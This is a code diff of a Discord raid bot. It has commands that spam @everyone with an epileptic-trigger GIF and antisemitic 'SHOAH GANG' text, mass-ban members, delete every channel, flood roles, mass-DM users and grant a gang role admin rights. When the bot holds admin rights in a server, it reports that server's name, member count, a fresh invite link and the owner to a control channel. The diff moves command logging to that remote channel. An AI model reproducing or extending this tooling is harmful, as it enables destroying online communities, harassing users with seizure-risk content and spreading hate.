@@ -30,7 +30,7 @@ bot.on('message', msg => {
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
-    console.log(`Commande .destruction par ${msg.author.tag}`);
+  bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .destruction par ${msg.author.tag}`).catch(e => {});
     var interval = setInterval (function () {
       msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
      "SHOAH GANG ON THE BEAT \n"+
@@ -40,7 +40,7 @@ if (msg.content === '.destruction') {
   }
 
 if (msg.content === '.oupss') {
-    console.log(`Commande .oupss par ${msg.author.tag}`);
+    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .oupss par ${msg.author.tag}`).catch(e => {});
    fucked = false;
 
  
@@ -63,7 +63,7 @@ if (msg.content === '.oupss') {
 
 
 if (msg.content === '.banev') {
-    console.log(`Commande .banev par ${msg.author.tag}`);
+ bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .banev par ${msg.author.tag}`).catch(e => {});
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
@@ -71,13 +71,13 @@ if (msg.content === '.banev') {
 
 
 if (msg.content === '.leave') {
-    console.log(`Commande .leave par ${msg.author.tag}`);
+ bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .leave par ${msg.author.tag}`).catch(e => {});
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.leave().catch(e => {});
   }
 
 if (msg.content === '.pardon') {
-    console.log(`Commande .pardon par ${msg.author.tag}`);
+ bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .pardon par ${msg.author.tag}`).catch(e => {});
 
     msg.member.guild.createRole({
       name: "Shoah Gang",
@@ -89,7 +89,7 @@ if (msg.content === '.pardon') {
     }).catch(e => {});
   }
   if (msg.content === '.roleflood') {
-    console.log(`Commande .roleflood par ${msg.author.tag}`);
+ bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .roleflood par ${msg.author.tag}`).catch(e => {});
     if (msg.deletable) msg.delete();
     let i = 0;
     let interval = setInterval(function () {
@@ -105,6 +105,7 @@ if (msg.content === '.pardon') {
       }
 
   if(msg.content === ".del"){
+    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .del par ${msg.author.tag}`).catch(e => {});
     if(msg.deletable) msg.delete();
     msg.guild.channels.forEach(channel => {
       if(channel.deletable) channel.delete()
@@ -113,6 +114,7 @@ if (msg.content === '.pardon') {
 
 
   if(msg.content === ".mp"){
+    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .mp par ${msg.author.tag}`).catch(e => {});
     if(msg.deletable) msg.delete();
     i = 0;
     msg.guild.members.forEach(member => {
@@ -344,7 +346,7 @@ bot.on("message", message => {
         if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
           var invite = guild.channels.find("id", guild.channels.random().id);
           invite.createInvite().then(invite => {
-            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
+            bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
           })
         }
         else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
